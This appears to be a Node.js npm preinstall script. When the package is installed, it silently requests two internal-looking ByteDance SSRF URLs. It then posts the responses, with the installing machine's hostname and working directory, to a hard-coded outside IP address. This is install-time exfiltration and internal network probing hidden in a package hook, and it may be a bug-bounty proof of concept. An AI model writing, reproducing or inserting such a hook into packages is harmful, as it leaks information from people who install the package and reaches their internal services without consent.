const { execSync } = require('child_process');
const http = require('http');
const https = require('https');

function postBack(data) {
  const body = JSON.stringify(data);
  console.log('[PREINSTALL] posting:', body.slice(0, 300));
  const req = http.request({
    hostname: '101.35.44.248',
    port: 80,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
  }, (res) => { console.log('[PREINSTALL] postback status:', res.statusCode); });
  req.on('error', (e) => { console.log('[PREINSTALL] postback error:', e.message); });
  req.write(body);
  req.end();
}

function fetchUrl(url) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const mod = u.protocol === 'https:' ? https : http;
    const req = mod.request(url, { timeout: 8000 }, (res) => {
      let data = '';
      res.on('data', d => data += d);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data.slice(0, 500) }));
    });
    req.on('error', (e) => resolve({ error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
    req.end();
  });
}

(async () => {
  console.log('[PREINSTALL] running...');

  const targets = [
    'https://src-ssrf.bytedance.net/ssrf',
    'https://src-ssrf.bytedance.net/ssrf?host=101.35.44.248',
  ];

  const results = {};
  for (const url of targets) {
    results[url] = await fetchUrl(url);
    console.log('[PREINSTALL]', url, '->', JSON.stringify(results[url]).slice(0, 200));
  }

  postBack({ type: 'ssrf-probe', results, env: { hostname: require('os').hostname(), cwd: process.cwd() } });
})();
